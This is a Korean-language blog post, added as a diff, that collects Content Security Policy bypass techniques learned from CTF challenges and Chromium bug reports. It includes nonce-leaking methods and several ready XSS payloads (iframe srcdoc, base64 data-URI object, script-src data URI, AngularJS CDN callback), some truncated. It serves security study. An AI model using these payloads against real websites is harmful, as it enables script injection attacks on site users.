@@ -1,0 +1,86 @@
+---
+title: "CSP Bypass 기법 정리"
+description: "Content Security Policy(CSP) 우회 기법 모음 - CTF 문제 풀이 기반"
+date: 2020-02-15
+tags: ["web-security", "csp", "bypass", "xss"]
+category: "Security Research"
+published: true
+---
+
+# CSP Bypass 기법 정리
+
+Codegate 2020 CSP 문제 풀다가 관련 우회기법 정리해야겠다 싶어서 대충 정리해서 올려봅니다.
+추가로 알게되는 정보가 있으면 업데이트 할게요~~
+
+## CTFZone 2019 - Script nonce : Cache Poisoning
+
+- `/index.php/` 등을 이용해 cache poisoning 하여 CSP script nonce를 고정
+
+## Codegate 2020
+
+### Script nonce : Header Injection - Status Code 102
+
+- Status Code 102 일때는 CSP가 동작하지 않는점을 이용
+- `header("HTTP/: 102");`
+
+### Script nonce : CSS Injection
+
+- CSS injection의 정규표현식으로 attribute에 접근 할 수 있는 것을 이용, 한글자씩 searching 해서 script nonce를 가져옴
+
+**참고 링크:**
+- https://lbherrera.me/solver.html
+- http://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html
+
+## Chromium 74 dev - Import Maps CSP Bypass
+
+**참고 링크:**
+- https://bugs.chromium.org/p/chromium/issues/detail?id=941340
+- https://test.shhnjk.com/imap.php
+
+## Chromium 78 (by @shhnjk)
+
+```html
+<iframe srcdoc="<script>alert(origin);window.stop()</script><meta http-equiv=refresh content='0;url=https://shhnjk.azurewebsites.net/csp_srcdoc.html'>"></iframe>
+```
+
+## Object Data CSP Bypass (by @shhnjk)
+
+```html
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+```
+
+## Script Src Bypass (by @akita_zen)
+
+```html
+<script ?/src="data:+,\u0061lert%281%29">/</script>
+```
+
+(by @404death)
+
+## 동일 및 신뢰 도메인에서 스크립트 실행
+
+`script-src 'self'` 또는 `script-src 'a.com'` 인 경우
+
+### Same or Trusted domain
+
+- `script-src 'self' unsafe-inline`
+- nginx 400 error, favicon.ico / robots.txt 등의 404 페이지를 임베딩해서 스크립트 삽입 가능
+- Request URI Too Big 에러도 활용 가능
+- Cookie max size 에러도 활용 가능
+
+**참고:** https://www.slideshare.net/ssusera0a306/volgactf-2018-neatly-bypassing-csp
+
+## Click Jacking / Dangling Markup
+
+CSP bypass (라기보단 dom code 내 중요정보 탈취쯤 될듯)
+
+**참고:** http://portswigger-labs.net/dangling_markup/
+
+## Angular JS CDN을 이용한 CSP Bypass
+
+```html
+<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26 ..
+ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax ...
+```
+
+etc...
